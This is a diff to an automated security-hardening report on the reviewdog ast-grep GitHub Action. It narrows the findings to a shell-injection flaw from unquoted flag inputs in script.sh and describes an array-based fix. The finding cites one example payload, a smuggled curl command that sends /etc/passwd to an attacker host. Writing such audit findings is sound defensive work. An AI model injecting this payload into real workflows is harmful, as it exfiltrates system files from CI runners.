@@ -10,38 +10,32 @@
 
 **Harden Agent Version:** `2`
 
-Action **reviewdog--action-ast-grep/v1.58.3** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).
+Action **reviewdog--action-ast-grep/v1.58.3** was hardened automatically. 1 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-Sub-rule (b): Unquoted shell variable expansions of workflow-controllable inputs in script.sh. `${INPUT_SG_FLAGS}` (line ~46) and `${INPUT_REVIEWDOG_FLAGS}` (line ~55) are expanded without double-quotes in shell commands. These env vars are populated from `inputs.sg_flags` and `inputs.reviewdog_flags` (both optional, default '') via the action.yml env: block. An attacker-controlled caller can supply values containing shell metacharacters (`;`, `|`, `&`, `$(...)`, etc.) that will be parsed by the shell. The `# shellcheck disable=SC2086` comment even acknowledges the unquoted expansion. The safe form for optional positional arguments is `${INPUT_SG_FLAGS:+"$INPUT_SG_FLAGS"}` and `${INPUT_REVIEWDOG_FLAGS:+"$INPUT_REVIEWDOG_FLAGS"}`.
+Rule (b) violation: Unquoted shell variable expansions of untrusted data in script.sh. Two env vars sourced from `inputs.*` (workflow-controllable) are expanded without double-quoting, allowing shell metacharacter injection:
+1. Line 48: `${INPUT_SG_FLAGS}` — sourced from `inputs.sg_flags`, used unquoted as additional flags to `ast-grep scan`. An attacker-controlled value like `; curl -d @/etc/passwd attacker.com` would be parsed by the shell.
+2. Line 57: `${INPUT_REVIEWDOG_FLAGS}` — sourced from `inputs.reviewdog_flags`, used unquoted as additional flags to `reviewdog`. Same injection risk.
+Neither uses the safe guarded form `${VAR:+"$VAR"}`. The `# shellcheck disable=SC2086` comment above the block suppresses the linter warning but does not mitigate the security risk.
 
 Locations:
 
-- `script.sh:46`
-- `script.sh:55`
-
-### missing-permissions (severity: medium)
-
-None of the 5 workflow files under .github/workflows/ define a top-level `permissions:` key, and no job in any of these files defines a job-level `permissions:` key. Without explicit permissions, workflows run with the repository's default token permissions, which may be overly broad (e.g., write access to contents, pull-requests, etc.). Affected files: depup.yml, labels.yml, release.yml, reviewdog.yml, test.yml.
-
-Locations:
-
-- `.github/workflows/depup.yml:1`
-- `.github/workflows/labels.yml:1`
-- `.github/workflows/release.yml:1`
-- `.github/workflows/reviewdog.yml:1`
-- `.github/workflows/test.yml:1`
+- `script.sh:48`
+- `script.sh:57`
 
 ## Iteration Notes
 
 ### Iteration 1
 
-**Fixes applied:** script-injection, missing-permissions
+**Fixes applied:** script-injection
 
 **Notes:**
 
-Fixed script-injection in script.sh by replacing unquoted ${INPUT_SG_FLAGS} (line 46) and ${INPUT_REVIEWDOG_FLAGS} (line 55) with the safe ${VAR:+"$VAR"} form, which drops the argument when empty and double-quotes it when non-empty, preventing shell metacharacter injection. Removed the now-unnecessary `# shellcheck disable=SC2086` comment. Added top-level `permissions:` blocks to all 5 workflow files: depup.yml (contents:write, pull-requests:write), labels.yml (issues:write), release.yml (contents:write, pull-requests:write), reviewdog.yml (checks:write, contents:read, pull-requests:write), and test.yml (checks:write, contents:read, pull-requests:write).
+Fixed both unquoted variable expansions in script.sh:
+1. `${INPUT_SG_FLAGS}` (line 48): Replaced with xargs-based bash array tokenization into `sg_flags`, expanded as `"${sg_flags[@]}"`.
+2. `${INPUT_REVIEWDOG_FLAGS}` (line 57): Replaced with xargs-based bash array tokenization into `reviewdog_flags`, expanded as `"${reviewdog_flags[@]}"`. Pre-tokenized before the pipeline so reviewdog still reads from stdin (jq pipe).
+Both arrays are guarded with `if [ -n "..." ]` to prevent empty-token injection. Removed the `# shellcheck disable=SC2086` comment since the issue is properly fixed.
 
